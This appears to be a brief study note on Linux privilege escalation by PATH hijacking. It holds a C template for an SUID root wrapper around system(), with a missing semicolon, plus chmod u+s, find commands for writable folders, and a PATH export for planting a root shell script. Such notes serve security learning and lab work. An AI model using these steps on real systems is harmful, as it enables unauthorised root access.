#LinuxPrivEsc 
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script

1.  What folders are located under $PATH
2.  Does your current user have write privileges for any of these folders?
3.  Can you modify $PATH?
4.  Is there a script/application you can start that will be affected by this vulnerability

```C
#include <unistd.h>
void main(){
	setuid(0);
	setgid(0);
	system("script to run")
}
```
`gcc executable.c -o executable -W`
Executable assigned the SUID bit by root. 
`chmod u+s executable`

If any writable folder is listed under PATH we could create a script that spawns a shell in that directory and have our executable run it. As the SUID bit is set, this script will run with root privilege

*Simple search for writable folders*
`find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`
*Alternative search*
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

If PATH can be modified, export your writable folder at the beginnig
`export PATH=/PATH_TO_FOLDER:$PATH`